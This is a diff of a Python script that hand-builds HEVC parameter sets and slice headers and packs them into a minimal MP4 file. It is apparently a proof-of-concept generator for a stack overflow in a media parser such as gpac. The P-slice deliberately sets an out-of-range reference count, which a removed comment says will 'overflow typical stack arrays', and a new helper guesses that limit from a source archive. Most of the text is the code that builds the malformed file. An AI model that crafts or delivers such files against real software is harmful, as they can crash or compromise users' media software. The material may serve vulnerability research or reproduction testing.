@@ -1,12 +1,11 @@
 import os
 import re
-import tarfile
-import tempfile
 import struct
-from typing import List, Tuple, Optional
+import tarfile
+from typing import Dict, List, Optional, Tuple
 
 
-class _BitWriter:
+class BitWriter:
     __slots__ = ("_buf", "_cur", "_nbits")
 
     def __init__(self):
@@ -14,482 +13,534 @@ class _BitWriter:
         self._cur = 0
         self._nbits = 0
 
+    def write_bit(self, b: int) -> None:
+        self._cur = (self._cur << 1) | (1 if b else 0)
+        self._nbits += 1
+        if self._nbits == 8:
+            self._buf.append(self._cur & 0xFF)
+            self._cur = 0
+            self._nbits = 0
+
     def write_bits(self, v: int, n: int) -> None:
         if n <= 0:
             return
-        v &= (1 << n) - 1
-        while n:
-            take = min(8 - self._nbits, n)
-            shift = n - take
-            bits = (v >> shift) & ((1 << take) - 1)
-            self._cur = (self._cur << take) | bits
-            self._nbits += take
-            n -= take
-            if self._nbits == 8:
-                self._buf.append(self._cur & 0xFF)
-                self._cur = 0
-                self._nbits = 0
+        for i in range(n - 1, -1, -1):
+            self.write_bit((v >> i) & 1)
 
-    def write_bool(self, b: bool) -> None:
-        self.write_bits(1 if b else 0, 1)
+    def write_ue(self, v: int) -> None:
+        if v < 0:
+            v = 0
+        code_num = v + 1
+        n = code_num.bit_length() - 1
+        for _ in range(n):
+            self.write_bit(0)
+        self.write_bit(1)
+        if n:
+            self.write_bits(code_num - (1 << n), n)
 
-    def write_ue(self, x: int) -> None:
-        if x < 0:
-            x = 0
-        code_num = x + 1
-        k = code_num.bit_length() - 1
-        self.write_bits(0, k)
-        self.write_bits(code_num, k + 1)
-
-    def write_se(self, x: int) -> None:
-        if x <= 0:
-            code_num = -2 * x
+    def write_se(self, v: int) -> None:
+        if v == 0:
+            self.write_ue(0)
+            return
+        if v > 0:
+            code_num = 2 * v - 1
         else:
-            code_num = 2 * x - 1
+            code_num = -2 * v
         self.write_ue(code_num)
 
     def rbsp_trailing_bits(self) -> None:
-        self.write_bits(1, 1)
-        if self._nbits:
-            self.write_bits(0, 8 - self._nbits)
+        self.write_bit(1)
+        while self._nbits != 0:
+            self.write_bit(0)
 
     def get_bytes(self) -> bytes:
+        if self._nbits:
+            self._buf.append((self._cur << (8 - self._nbits)) & 0xFF)
+            self._cur = 0
+            self._nbits = 0
         return bytes(self._buf)
 
 
-def _escape_rbsp_to_ebsp(rbsp: bytes) -> bytes:
+def rbsp_to_ebsp(rbsp: bytes) -> bytes:
     out = bytearray()
-    zeros = 0
+    zcount = 0
     for b in rbsp:
-        if zeros >= 2 and b <= 3:
+        if zcount >= 2 and b <= 3:
             out.append(3)
-            zeros = 0
+            zcount = 0
         out.append(b)
         if b == 0:
-            zeros += 1
+            zcount += 1
         else:
-            zeros = 0
+            zcount = 0
     return bytes(out)
 
 
-def _hevc_nal_header(nal_type: int, layer_id: int = 0, temporal_id_plus1: int = 1) -> bytes:
-    nal_type &= 0x3F
-    layer_id &= 0x3F
-    temporal_id_plus1 &= 0x07
-    v = (nal_type << 9) | (layer_id << 3) | temporal_id_plus1
-    return struct.pack(">H", v)
+def hevc_nal_header(nal_unit_type: int, nuh_layer_id: int = 0, nuh_temporal_id_plus1: int = 1) -> bytes:
+    b0 = ((nal_unit_type & 0x3F) << 1) | ((nuh_layer_id >> 5) & 0x01)
+    b1 = ((nuh_layer_id & 0x1F) << 3) | (nuh_temporal_id_plus1 & 0x07)
+    return bytes([b0, b1])
 
 
-def _nal_unit(nal_type: int, rbsp: bytes) -> bytes:
-    return _hevc_nal_header(nal_type) + _escape_rbsp_to_ebsp(rbsp)
+def make_hevc_nal(nal_unit_type: int, rbsp_payload: bytes) -> bytes:
+    return hevc_nal_header(nal_unit_type) + rbsp_to_ebsp(rbsp_payload)
 
 
-def _profile_tier_level(w: _BitWriter, profile_idc: int = 1, level_idc: int = 120) -> None:
-    w.write_bits(0, 2)  # general_profile_space
-    w.write_bool(False)  # general_tier_flag
-    w.write_bits(profile_idc & 0x1F, 5)  # general_profile_idc
-    w.write_bits(0, 32)  # general_profile_compatibility_flag[32]
-    w.write_bool(True)   # general_progressive_source_flag
-    w.write_bool(False)  # general_interlaced_source_flag
-    w.write_bool(False)  # general_non_packed_constraint_flag
-    w.write_bool(True)   # general_frame_only_constraint_flag
-    w.write_bits(0, 44)  # general_reserved_zero_44bits
-    w.write_bits(level_idc & 0xFF, 8)  # general_level_idc
+def write_profile_tier_level(bw: BitWriter, max_sub_layers_minus1: int) -> None:
+    # general_profile_space(2), general_tier_flag(1), general_profile_idc(5)
+    bw.write_bits(0, 2)
+    bw.write_bits(0, 1)
+    bw.write_bits(1, 5)  # Main profile
+    bw.write_bits(0, 32)  # general_profile_compatibility_flags
+    bw.write_bits(0, 48)  # general_constraint_indicator_flags
+    bw.write_bits(120, 8)  # general_level_idc
+
+    # sub_layer_profile_present_flag[], sub_layer_level_present_flag[]
+    for _ in range(max_sub_layers_minus1):
+        bw.write_bit(0)
+        bw.write_bit(0)
+
+    if max_sub_layers_minus1 > 0:
+        for _ in range(8 - max_sub_layers_minus1):
+            bw.write_bits(0, 2)
+
+    for _ in range(max_sub_layers_minus1):
+        # no sub-layer profile/level data since flags are 0
+        pass
 
 
-def _make_vps_rbsp() -> bytes:
-    w = _BitWriter()
-    w.write_bits(0, 4)  # vps_video_parameter_set_id
-    w.write_bool(True)  # vps_base_layer_internal_flag
-    w.write_bool(True)  # vps_base_layer_available_flag
-    w.write_bits(0, 6)  # vps_max_layers_minus1
-    w.write_bits(0, 3)  # vps_max_sub_layers_minus1
-    w.write_bool(True)  # vps_temporal_id_nesting_flag
-    w.write_bits(0xFFFF, 16)  # vps_reserved_0xffff_16bits
-    _profile_tier_level(w, profile_idc=1, level_idc=120)
-    w.write_bool(True)  # vps_sub_layer_ordering_info_present_flag
-    w.write_ue(4)  # vps_max_dec_pic_buffering_minus1[0]
-    w.write_ue(0)  # vps_max_num_reorder_pics[0]
-    w.write_ue(0)  # vps_max_latency_increase_plus1[0]
-    w.write_bits(0, 6)  # vps_max_layer_id
-    w.write_ue(0)  # vps_num_layer_sets_minus1
-    w.write_bool(False)  # vps_timing_info_present_flag
-    w.write_bool(False)  # vps_extension_flag
-    w.rbsp_trailing_bits()
-    return w.get_bytes()
+def build_vps_rbsp() -> bytes:
+    bw = BitWriter()
+    bw.write_bits(0, 4)  # vps_video_parameter_set_id
+    bw.write_bit(1)      # vps_base_layer_internal_flag
+    bw.write_bit(1)      # vps_base_layer_available_flag
+    bw.write_bits(0, 6)  # vps_max_layers_minus1
+    bw.write_bits(0, 3)  # vps_max_sub_layers_minus1
+    bw.write_bit(1)      # vps_temporal_id_nesting_flag
+    bw.write_bits(0xFFFF, 16)  # vps_reserved_0xffff_16bits
+    write_profile_tier_level(bw, 0)
+    bw.write_bit(1)      # vps_sub_layer_ordering_info_present_flag
+    # i = 0..0
+    bw.write_ue(0)       # vps_max_dec_pic_buffering_minus1
+    bw.write_ue(0)       # vps_max_num_reorder_pics
+    bw.write_ue(0)       # vps_max_latency_increase_plus1
+    bw.write_bits(0, 6)  # vps_max_layer_id
+    bw.write_ue(0)       # vps_num_layer_sets_minus1
+    bw.write_bit(0)      # vps_timing_info_present_flag
+    bw.write_bit(0)      # vps_extension_flag
+    bw.rbsp_trailing_bits()
+    return bw.get_bytes()
 
 
-def _make_sps_rbsp() -> bytes:
-    w = _BitWriter()
-    w.write_bits(0, 4)  # sps_video_parameter_set_id
-    w.write_bits(0, 3)  # sps_max_sub_layers_minus1
-    w.write_bool(True)  # sps_temporal_id_nesting_flag
-    _profile_tier_level(w, profile_idc=1, level_idc=120)
-    w.write_ue(0)  # sps_seq_parameter_set_id
-    w.write_ue(1)  # chroma_format_idc (4:2:0)
-    w.write_ue(64)  # pic_width_in_luma_samples
-    w.write_ue(64)  # pic_height_in_luma_samples
-    w.write_bool(False)  # conformance_window_flag
-    w.write_ue(0)  # bit_depth_luma_minus8
-    w.write_ue(0)  # bit_depth_chroma_minus8
-    w.write_ue(0)  # log2_max_pic_order_cnt_lsb_minus4 (=> 4 bits)
-    w.write_bool(True)  # sps_sub_layer_ordering_info_present_flag
-    w.write_ue(4)  # sps_max_dec_pic_buffering_minus1[0]
-    w.write_ue(0)  # sps_max_num_reorder_pics[0]
-    w.write_ue(0)  # sps_max_latency_increase_plus1[0]
-    w.write_ue(0)  # log2_min_luma_coding_block_size_minus3
-    w.write_ue(0)  # log2_diff_max_min_luma_coding_block_size
-    w.write_ue(0)  # log2_min_luma_transform_block_size_minus2
-    w.write_ue(0)  # log2_diff_max_min_luma_transform_block_size
-    w.write_ue(0)  # max_transform_hierarchy_depth_inter
-    w.write_ue(0)  # max_transform_hierarchy_depth_intra
-    w.write_bool(False)  # scaling_list_enabled_flag
-    w.write_bool(False)  # amp_enabled_flag
-    w.write_bool(False)  # sample_adaptive_offset_enabled_flag
-    w.write_bool(False)  # pcm_enabled_flag
-    w.write_ue(1)  # num_short_term_ref_pic_sets
+def build_sps_rbsp() -> bytes:
+    bw = BitWriter()
+    bw.write_bits(0, 4)  # sps_video_parameter_set_id
+    bw.write_bits(0, 3)  # sps_max_sub_layers_minus1
+    bw.write_bit(1)      # sps_temporal_id_nesting_flag
+    write_profile_tier_level(bw, 0)
+    bw.write_ue(0)       # sps_seq_parameter_set_id
+    bw.write_ue(1)       # chroma_format_idc (4:2:0)
+    bw.write_ue(16)      # pic_width_in_luma_samples
+    bw.write_ue(16)      # pic_height_in_luma_samples
+    bw.write_bit(0)      # conformance_window_flag
+    bw.write_ue(0)       # bit_depth_luma_minus8
+    bw.write_ue(0)       # bit_depth_chroma_minus8
+    bw.write_ue(4)       # log2_max_pic_order_cnt_lsb_minus4 => 8 bits
+    bw.write_bit(1)      # sps_sub_layer_ordering_info_present_flag
+    bw.write_ue(2)       # sps_max_dec_pic_buffering_minus1 (>= num refs)
+    bw.write_ue(0)       # sps_max_num_reorder_pics
+    bw.write_ue(0)       # sps_max_latency_increase_plus1
 
-    # st_ref_pic_set(0): 1 negative ref, used
-    w.write_ue(1)  # num_negative_pics
-    w.write_ue(0)  # num_positive_pics
-    w.write_ue(0)  # delta_poc_s0_minus1 (=> -1)
-    w.write_bool(True)  # used_by_curr_pic_s0_flag
+    bw.write_ue(0)       # log2_min_luma_coding_block_size_minus3
+    bw.write_ue(0)       # log2_diff_max_min_luma_coding_block_size
+    bw.write_ue(0)       # log2_min_luma_transform_block_size_minus2
+    bw.write_ue(0)       # log2_diff_max_min_luma_transform_block_size
+    bw.write_ue(0)       # max_transform_hierarchy_depth_inter
+    bw.write_ue(0)       # max_transform_hierarchy_depth_intra
+    bw.write_bit(0)      # scaling_list_enabled_flag
+    bw.write_bit(0)      # amp_enabled_flag
+    bw.write_bit(0)      # sample_adaptive_offset_enabled_flag
+    bw.write_bit(0)      # pcm_enabled_flag
 
-    w.write_bool(False)  # long_term_ref_pics_present_flag
-    w.write_bool(False)  # sps_temporal_mvp_enabled_flag
-    w.write_bool(False)  # strong_intra_smoothing_enabled_flag
-    w.write_bool(False)  # vui_parameters_present_flag
-    w.write_bool(False)  # sps_extension_present_flag
-    w.rbsp_trailing_bits()
-    return w.get_bytes()
+    bw.write_ue(1)       # num_short_term_ref_pic_sets
+    # st_ref_pic_set(0): inter_ref_pic_set_prediction_flag = 0
+    bw.write_bit(0)
+    bw.write_ue(1)       # num_negative_pics
+    bw.write_ue(0)       # num_positive_pics
+    bw.write_ue(0)       # delta_poc_s0_minus1[0] => delta = -1
+    bw.write_bit(1)      # used_by_curr_pic_s0_flag[0]
 
-
-def _make_pps_rbsp() -> bytes:
-    w = _BitWriter()
-    w.write_ue(0)  # pps_pic_parameter_set_id
-    w.write_ue(0)  # pps_seq_parameter_set_id
-    w.write_bool(False)  # dependent_slice_segments_enabled_flag
-    w.write_bool(False)  # output_flag_present_flag
-    w.write_bits(0, 3)  # num_extra_slice_header_bits
-    w.write_bool(False)  # sign_data_hiding_enabled_flag
-    w.write_bool(False)  # cabac_init_present_flag
-    w.write_ue(0)  # num_ref_idx_l0_default_active_minus1
-    w.write_ue(0)  # num_ref_idx_l1_default_active_minus1
-    w.write_se(0)  # init_qp_minus26
-    w.write_bool(False)  # constrained_intra_pred_flag
-    w.write_bool(False)  # transform_skip_enabled_flag
-    w.write_bool(False)  # cu_qp_delta_enabled_flag
-    w.write_se(0)  # pps_cb_qp_offset
-    w.write_se(0)  # pps_cr_qp_offset
-    w.write_bool(False)  # pps_slice_chroma_qp_offsets_present_flag
-    w.write_bool(False)  # weighted_pred_flag
-    w.write_bool(False)  # weighted_bipred_flag
-    w.write_bool(False)  # transquant_bypass_enabled_flag
-    w.write_bool(False)  # tiles_enabled_flag
-    w.write_bool(False)  # entropy_coding_sync_enabled_flag
-    w.write_bool(False)  # pps_loop_filter_across_slices_enabled_flag
-    w.write_bool(False)  # deblocking_filter_control_present_flag
-    w.write_bool(False)  # pps_scaling_list_data_present_flag
-    w.write_bool(False)  # lists_modification_present_flag
-    w.write_ue(0)  # log2_parallel_merge_level_minus2
-    w.write_bool(False)  # slice_segment_header_extension_present_flag
-    w.write_bool(False)  # pps_extension_present_flag
-    w.rbsp_trailing_bits()
-    return w.get_bytes()
+    bw.write_bit(0)      # long_term_ref_pics_present_flag
+    bw.write_bit(0)      # sps_temporal_mvp_enabled_flag
+    bw.write_bit(0)      # strong_intra_smoothing_enabled_flag
+    bw.write_bit(0)      # vui_parameters_present_flag
+    bw.write_bit(0)      # sps_extension_present_flag
+    bw.rbsp_trailing_bits()
+    return bw.get_bytes()
 
 
-def _make_slice_rbsp(nal_type: int, slice_type: int, poc_lsb: int, overflow_refs: bool) -> bytes:
-    w = _BitWriter()
-    w.write_bool(True)  # first_slice_segment_in_pic_flag
-    if 16 <= nal_type <= 23:
-        w.write_bool(False)  # no_output_of_prior_pics_flag
-    w.write_ue(0)  # slice_pic_parameter_set_id
-
-    w.write_ue(slice_type)  # slice_type (0=B,1=P,2=I)
-    w.write_bits(poc_lsb & 0xF, 4)  # slice_pic_order_cnt_lsb (log2_max_pic_order_cnt_lsb = 4)
-
-    if nal_type not in (19, 20, 21, 22):  # not IDR/BLA etc; keep minimal and generic
-        # For non-IDR: short_term_ref_pic_set_sps_flag
-        w.write_bool(True)  # short_term_ref_pic_set_sps_flag (use SPS RPS 0)
-
-    if slice_type != 2:
-        w.write_bool(True)  # num_ref_idx_active_override_flag
-        if overflow_refs:
-            w.write_ue(31)  # num_ref_idx_l0_active_minus1 => 32 refs (overflow typical stack arrays)
-        else:
-            w.write_ue(0)
-        w.write_ue(0)  # five_minus_max_num_merge_cand
-
-    w.write_se(0)  # slice_qp_delta
-    w.rbsp_trailing_bits()
-    return w.get_bytes()
-
-
-def _build_annexb_stream() -> bytes:
-    vps = _nal_unit(32, _make_vps_rbsp())
-    sps = _nal_unit(33, _make_sps_rbsp())
-    pps = _nal_unit(34, _make_pps_rbsp())
-
-    idr_rbsp = _make_slice_rbsp(19, slice_type=2, poc_lsb=0, overflow_refs=False)
-    idr = _nal_unit(19, idr_rbsp)
-
-    p_rbsp = _make_slice_rbsp(1, slice_type=1, poc_lsb=1, overflow_refs=True)
-    psl = _nal_unit(1, p_rbsp)
-
-    sc = b"\x00\x00\x00\x01"
-    return sc + vps + sc + sps + sc + pps + sc + idr + sc + psl
+def build_pps_rbsp() -> bytes:
+    bw = BitWriter()
+    bw.write_ue(0)       # pps_pic_parameter_set_id
+    bw.write_ue(0)       # pps_seq_parameter_set_id
+    bw.write_bit(0)      # dependent_slice_segments_enabled_flag
+    bw.write_bit(0)      # output_flag_present_flag
+    bw.write_bits(0, 3)  # num_extra_slice_header_bits
+    bw.write_bit(0)      # sign_data_hiding_enabled_flag
+    bw.write_bit(0)      # cabac_init_present_flag
+    bw.write_ue(0)       # num_ref_idx_l0_default_active_minus1
+    bw.write_ue(0)       # num_ref_idx_l1_default_active_minus1
+    bw.write_se(0)       # init_qp_minus26
+    bw.write_bit(0)      # constrained_intra_pred_flag
+    bw.write_bit(0)      # transform_skip_enabled_flag
+    bw.write_bit(0)      # cu_qp_delta_enabled_flag
+    bw.write_se(0)       # pps_cb_qp_offset
+    bw.write_se(0)       # pps_cr_qp_offset
+    bw.write_bit(0)      # pps_slice_chroma_qp_offsets_present_flag
+    bw.write_bit(0)      # weighted_pred_flag
+    bw.write_bit(0)      # weighted_bipred_flag
+    bw.write_bit(0)      # transquant_bypass_enabled_flag
+    bw.write_bit(0)      # tiles_enabled_flag
+    bw.write_bit(0)      # entropy_coding_sync_enabled_flag
+    bw.write_bit(0)      # pps_loop_filter_across_slices_enabled_flag
+    bw.write_bit(0)      # deblocking_filter_control_present_flag
+    bw.write_bit(0)      # pps_scaling_list_data_present_flag
+    bw.write_bit(0)      # lists_modification_present_flag
+    bw.write_ue(0)       # log2_parallel_merge_level_minus2
+    bw.write_bit(0)      # slice_segment_header_extension_present_flag
+    bw.write_bit(0)      # pps_extension_present_flag
+    bw.rbsp_trailing_bits()
+    return bw.get_bytes()
 
 
-def _build_length_prefixed_stream(length_size: int = 4, include_param_sets: bool = True) -> bytes:
-    nals = []
-    if include_param_sets:
-        nals.append(_nal_unit(32, _make_vps_rbsp()))
-        nals.append(_nal_unit(33, _make_sps_rbsp()))
-        nals.append(_nal_unit(34, _make_pps_rbsp()))
-    nals.append(_nal_unit(19, _make_slice_rbsp(19, slice_type=2, poc_lsb=0, overflow_refs=False)))
-    nals.append(_nal_unit(1, _make_slice_rbsp(1, slice_type=1, poc_lsb=1, overflow_refs=True)))
+def build_aud_rbsp(pic_type: int = 0) -> bytes:
+    bw = BitWriter()
+    bw.write_bits(pic_type & 0x7, 3)
+    bw.rbsp_trailing_bits()
+    return bw.get_bytes()
 
+
+def build_slice_rbsp_idr() -> bytes:
+    bw = BitWriter()
+    bw.write_bit(1)      # first_slice_segment_in_pic_flag
+    bw.write_bit(0)      # no_output_of_prior_pics_flag (IRAP)
+    bw.write_ue(0)       # slice_pic_parameter_set_id
+    bw.write_ue(2)       # slice_type = I
+    bw.write_se(0)       # slice_qp_delta
+    bw.rbsp_trailing_bits()
+    return bw.get_bytes()
+
+
+def build_slice_rbsp_p(num_ref_idx_l0_active_minus1: int) -> bytes:
+    bw = BitWriter()
+    bw.write_bit(1)      # first_slice_segment_in_pic_flag
+    bw.write_ue(0)       # slice_pic_parameter_set_id
+    bw.write_ue(1)       # slice_type = P
+    bw.write_bits(1, 8)  # slice_pic_order_cnt_lsb (8 bits)
+    bw.write_bit(1)      # short_term_ref_pic_set_sps_flag
+    bw.write_bit(1)      # num_ref_idx_active_override_flag
+    bw.write_ue(num_ref_idx_l0_active_minus1)
+    bw.write_ue(0)       # five_minus_max_num_merge_cand
+    bw.write_se(0)       # slice_qp_delta
+    bw.rbsp_trailing_bits()
+    return bw.get_bytes()
+
+
+def u8(x: int) -> bytes:
+    return struct.pack(">B", x & 0xFF)
+
+
+def u16(x: int) -> bytes:
+    return struct.pack(">H", x & 0xFFFF)
+
+
+def u32(x: int) -> bytes:
+    return struct.pack(">I", x & 0xFFFFFFFF)
+
+
+def box(typ: bytes, data: bytes) -> bytes:
+    return u32(8 + len(data)) + typ + data
+
+
+def full_box(typ: bytes, version: int, flags: int, data: bytes) -> bytes:
+    hdr = bytes([version & 0xFF]) + (flags & 0xFFFFFF).to_bytes(3, "big")
+    return box(typ, hdr + data)
+
+
+def pack_language_und() -> int:
+    # 'und' => 0x55C4 in ISO-639 packed 5-bit fields.
+    return 0x55C4
+
+
+def build_hvcc(vps: bytes, sps: bytes, pps: bytes, length_size_minus_one: int = 3) -> bytes:
+    # vps/sps/pps are complete NAL units (header+ebsp) to store in arrays.
+    record = bytearray()
+    record += b"\x01"  # configurationVersion
+    # general_profile_space(2)=0, general_tier_flag(1)=0, general_profile_idc(5)=1
+    record += bytes([0x01])
+    record += u32(0)  # general_profile_compatibility_flags
+    record += (0).to_bytes(6, "big")  # general_constraint_indicator_flags
+    record += b"\x78"  # general_level_idc = 120
+    record += u16(0xF000)  # reserved(4 bits 1111) + min_spatial_segmentation_idc(12)=0
+    record += b"\xFC"      # reserved(6 bits 111111) + parallelismType(2)=0
+    record += b"\xFD"      # reserved(6 bits 111111) + chromaFormat(2)=1
+    record += b"\xF8"      # reserved(5 bits 11111) + bitDepthLumaMinus8(3)=0
+    record += b"\xF8"      # reserved(5 bits 11111) + bitDepthChromaMinus8(3)=0
+    record += u16(0)       # avgFrameRate
+    # constantFrameRate(2)=0, numTemporalLayers(3)=1, temporalIdNested(1)=1, lengthSizeMinusOne(2)
+    record += bytes([(0 << 6) | (1 << 3) | (1 << 2) | (length_size_minus_one & 0x3)])
+
+    arrays = []
+    # array_completeness(1)=1, reserved(1)=0, nal_unit_type(6)
+    for nal_type, nal in ((32, vps), (33, sps), (34, pps)):
+        arr = bytearray()
+        arr += bytes([0x80 | (nal_type & 0x3F)])
+        arr += u16(1)  # numNalus
+        arr += u16(len(nal))
+        arr += nal
+        arrays.append(bytes(arr))
+
+    record += bytes([len(arrays)])
+    for a in arrays:
+        record += a
+    return box(b"hvcC", bytes(record))
+
+
+def build_visual_sample_entry_hvc1(hvcc_box: bytes, width: int = 16, height: int = 16) -> bytes:
+    # VisualSampleEntry fields + contained boxes (hvcC)
+    d = bytearray()
+    d += b"\x00" * 6  # reserved
+    d += u16(1)       # data_reference_index
+    d += u16(0)       # pre_defined
+    d += u16(0)       # reserved
+    d += b"\x00" * 12 # pre_defined
+    d += u16(width)
+    d += u16(height)
+    d += u32(0x00480000)  # horizresolution 72 dpi
+    d += u32(0x00480000)  # vertresolution 72 dpi
+    d += u32(0)           # reserved
+    d += u16(1)           # frame_count
+    # compressorname 32 bytes: first byte length, then name, padded
+    name = b"gpac"
+    comp = bytes([len(name)]) + name + b"\x00" * (31 - len(name))
+    d += comp
+    d += u16(0x0018)      # depth
+    d += u16(0xFFFF)      # pre_defined
+    d += hvcc_box
+    return box(b"hvc1", bytes(d))
+
+
+def build_minimal_mp4_hevc(samples: List[bytes], hvcc_box: bytes, width: int = 16, height: int = 16) -> bytes:
+    # ftyp
+    ftyp = box(b"ftyp", b"isom" + u32(0x200) + b"isom" + b"iso2" + b"mp41")
+
+    # mvhd
+    mvhd_data = bytearray()
+    mvhd_data += u32(0)  # creation_time
+    mvhd_data += u32(0)  # modification_time
+    mvhd_data += u32(90000)  # timescale
+    mvhd_data += u32(max(1, len(samples)))  # duration
+    mvhd_data += u32(0x00010000)  # rate 1.0
+    mvhd_data += u16(0x0100)      # volume 1.0
+    mvhd_data += u16(0)           # reserved
+    mvhd_data += u32(0) + u32(0)  # reserved
+    # matrix (identity)
+    mvhd_data += u32(0x00010000) + u32(0) + u32(0)
+    mvhd_data += u32(0) + u32(0x00010000) + u32(0)
+    mvhd_data += u32(0) + u32(0) + u32(0x40000000)
+    mvhd_data += b"\x00" * 24     # pre_defined
+    mvhd_data += u32(2)           # next_track_id
+    mvhd = full_box(b"mvhd", 0, 0, bytes(mvhd_data))
+
+    # tkhd
+    tkhd_data = bytearray()
+    tkhd_data += u32(0)  # creation
+    tkhd_data += u32(0)  # modification
+    tkhd_data += u32(1)  # track_id
+    tkhd_data += u32(0)  # reserved
+    tkhd_data += u32(max(1, len(samples)))  # duration
+    tkhd_data += u32(0) + u32(0)  # reserved
+    tkhd_data += u16(0)  # layer
+    tkhd_data += u16(0)  # alternate_group
+    tkhd_data += u16(0)  # volume (0 for video)
+    tkhd_data += u16(0)  # reserved
+    tkhd_data += u32(0x00010000) + u32(0) + u32(0)
+    tkhd_data += u32(0) + u32(0x00010000) + u32(0)
+    tkhd_data += u32(0) + u32(0) + u32(0x40000000)
+    tkhd_data += u32(width << 16)
+    tkhd_data += u32(height << 16)
+    tkhd = full_box(b"tkhd", 0, 0x000007, bytes(tkhd_data))
+
+    # mdhd
+    mdhd_data = bytearray()
+    mdhd_data += u32(0)  # creation
+    mdhd_data += u32(0)  # modification
+    mdhd_data += u32(90000)  # timescale
+    mdhd_data += u32(max(1, len(samples)))  # duration
+    mdhd_data += u16(pack_language_und())
+    mdhd_data += u16(0)
+    mdhd = full_box(b"mdhd", 0, 0, bytes(mdhd_data))
+
+    # hdlr (vide)
+    hdlr_data = bytearray()
+    hdlr_data += u32(0)       # pre_defined
+    hdlr_data += b"vide"      # handler_type
+    hdlr_data += u32(0) + u32(0) + u32(0)  # reserved
+    hdlr_data += b"VideoHandler\x00"
+    hdlr = full_box(b"hdlr", 0, 0, bytes(hdlr_data))
+
+    # vmhd
+    vmhd_data = u16(0) + u16(0) + u16(0) + u16(0)  # graphicsmode + opcolor
+    vmhd = full_box(b"vmhd", 0, 0x000001, vmhd_data)
+
+    # dinf/dref/url
+    url = full_box(b"url ", 0, 0x000001, b"")
+    dref = full_box(b"dref", 0, 0, u32(1) + url)
+    dinf = box(b"dinf", dref)
+
+    # stsd
+    sample_entry = build_visual_sample_entry_hvc1(hvcc_box, width=width, height=height)
+    stsd = full_box(b"stsd", 0, 0, u32(1) + sample_entry)
+
+    # stts (all samples have delta 1)
+    stts = full_box(b"stts", 0, 0, u32(1) + u32(len(samples)) + u32(1))
+
+    # stsc (one chunk, all samples)
+    stsc = full_box(b"stsc", 0, 0, u32(1) + u32(1) + u32(len(samples)) + u32(1))
+
+    # stsz (variable sizes)
+    sizes = b"".join(u32(len(s)) for s in samples)
+    stsz = full_box(b"stsz", 0, 0, u32(0) + u32(len(samples)) + sizes)
+
+    # stco (placeholder offset)
+    stco_placeholder = full_box(b"stco", 0, 0, u32(1) + u32(0))
+
+    stbl = box(b"stbl", stsd + stts + stsc + stsz + stco_placeholder)
+    minf = box(b"minf", vmhd + dinf + stbl)
+    mdia = box(b"mdia", mdhd + hdlr + minf)
+    trak = box(b"trak", tkhd + mdia)
+    moov = box(b"moov", mvhd + trak)
+
+    mdat_payload = b"".join(samples)
+    mdat = box(b"mdat", mdat_payload)
+
+    # compute and patch stco offset (chunk offset to start of mdat payload)
+    chunk_offset = len(ftyp) + len(moov) + 8  # mdat header is 8 bytes
+    stco = full_box(b"stco", 0, 0, u32(1) + u32(chunk_offset))
+
+    # rebuild stbl/minf/mdia/trak/moov with patched stco
+    stbl = box(b"stbl", stsd + stts + stsc + stsz + stco)
+    minf = box(b"minf", vmhd + dinf + stbl)
+    mdia = box(b"mdia", mdhd + hdlr + minf)
+    trak = box(b"trak", tkhd + mdia)
+    moov = box(b"moov", mvhd + trak)
+
+    return ftyp + moov + mdat
+
+
+def make_length_prefixed_sample(nals: List[bytes]) -> bytes:
     out = bytearray()
     for nal in nals:
-        ln = len(nal)
-        if length_size == 4:
-            out += struct.pack(">I", ln)
-        elif length_size == 2:
-            out += struct.pack(">H", ln & 0xFFFF)
-        elif length_size == 1:
-            out.append(ln & 0xFF)
-        else:
-            out += struct.pack(">I", ln)
+        out += u32(len(nal))
         out += nal
     return bytes(out)
 
 
-def _mp4_box(typ: bytes, payload: bytes) -> bytes:
-    return struct.pack(">I4s", 8 + len(payload), typ) + payload
+def scan_tar_for_hints(src_path: str) -> Tuple[bool, int]:
+    """
+    Returns (wants_mp4, ref_limit_guess)
+    ref_limit_guess is used to pick num_ref_idx_l0_active_minus1.
+    """
+    wants_mp4 = False
+    ref_limit_guess = 16
 
+    func_buf = None
 
-def _mp4_fullbox(typ: bytes, version: int, flags: int, payload: bytes) -> bytes:
-    return _mp4_box(typ, struct.pack(">B", version & 0xFF) + struct.pack(">I", flags & 0xFFFFFF)[1:] + payload)
-
-
-def _build_hvcc(vps_nal: bytes, sps_nal: bytes, pps_nal: bytes, length_size_minus_one: int = 3) -> bytes:
-    # General profile fields (match profile_tier_level used)
-    general_profile_space = 0
-    general_tier_flag = 0
-    general_profile_idc = 1
-    general_profile_compatibility_flags = 0
-    general_constraint_indicator_flags = b"\x00\x00\x00\x00\x00\x00"
-    general_level_idc = 120
-
-    b0 = (general_profile_space << 6) | (general_tier_flag << 5) | (general_profile_idc & 0x1F)
-    rec = bytearray()
-    rec.append(1)  # configurationVersion
-    rec.append(b0)
-    rec += struct.pack(">I", general_profile_compatibility_flags)
-    rec += general_constraint_indicator_flags
-    rec.append(general_level_idc & 0xFF)
-
-    rec += struct.pack(">H", 0xF000 | 0)  # min_spatial_segmentation_idc
-    rec.append(0xFC | 0)  # parallelismType
-    rec.append(0xFC | 1)  # chromaFormat (1)
-    rec.append(0xF8 | 0)  # bitDepthLumaMinus8
-    rec.append(0xF8 | 0)  # bitDepthChromaMinus8
-    rec += struct.pack(">H", 0)  # avgFrameRate
-
-    # constantFrameRate(2)=0, numTemporalLayers(3)=1, temporalIdNested(1)=1, lengthSizeMinusOne(2)=length_size_minus_one
-    packed = (0 << 6) | (1 << 3) | (1 << 2) | (length_size_minus_one & 3)
-    rec.append(packed & 0xFF)
-
-    arrays = [
-        (32, vps_nal),
-        (33, sps_nal),
-        (34, pps_nal),
-    ]
-    rec.append(len(arrays) & 0xFF)  # numOfArrays
-
-    for nal_type, nal in arrays:
-        rec.append(0x80 | (nal_type & 0x3F))  # array_completeness=1, reserved=0, nal_unit_type
-        rec += struct.pack(">H", 1)  # numNalus
-        rec += struct.pack(">H", len(nal))
-        rec += nal
-
-    return bytes(rec)
-
-
-def _build_minimal_mp4_with_hevc(sample_nals: List[bytes], vps: bytes, sps: bytes, pps: bytes) -> bytes:
-    # Sample data: 4-byte length prefixes
-    sample_payload = bytearray()
-    for nal in sample_nals:
-        sample_payload += struct.pack(">I", len(nal))
-        sample_payload += nal
-    sample_payload = bytes(sample_payload)
-
-    ftyp = _mp4_box(b"ftyp", b"isom" + struct.pack(">I", 0) + b"isom" + b"iso2" + b"mp41")
-
-    # hvcC
-    hvcc = _mp4_box(b"hvcC", _build_hvcc(vps, sps, pps, length_size_minus_one=3))
-
